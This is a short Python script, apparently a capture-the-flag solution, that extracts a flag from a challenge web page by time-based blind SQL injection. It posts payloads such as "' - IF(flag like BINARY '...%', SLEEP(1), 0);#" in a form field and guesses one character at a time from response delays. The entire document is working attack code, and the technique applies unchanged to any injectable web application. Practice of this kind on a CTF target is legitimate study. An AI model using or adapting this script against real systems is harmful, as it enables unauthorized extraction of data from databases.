#!/usr/bin/env nix-shell
#!nix-shell -i python3 -p python3 python3Packages.requests

import requests
from datetime import timedelta
from time import sleep


URL = "http://challenges.unitedctf.ca:18000/challenge4.php"
FLAG = 'FLAG-'
# ' - IF(FLAG LIKE 'F%', SLEEP(1), 0) ;#

CHARS = list(range(32, 126))
CHARS.remove(ord('_'))
CHARS.remove(ord('%'))
CHARS.append(ord('_'))

while True:
    for ch in CHARS:
        req = f"' - IF(flag like BINARY '{FLAG+chr(ch)}%', SLEEP(1), 0);#"
        print("Trying", req)
        r = requests.post(URL, data = {'flagID': req})
        if r.elapsed > timedelta(seconds=1):
            FLAG += chr(ch)
            print('One more result:', FLAG)
            sleep(0.05) # Sleep for 10ms
            break
        sleep(0.01) # Sleep for 10ms
    else:
        # We reached the end of the range
        print('Done!!!!!', FLAG)
        break

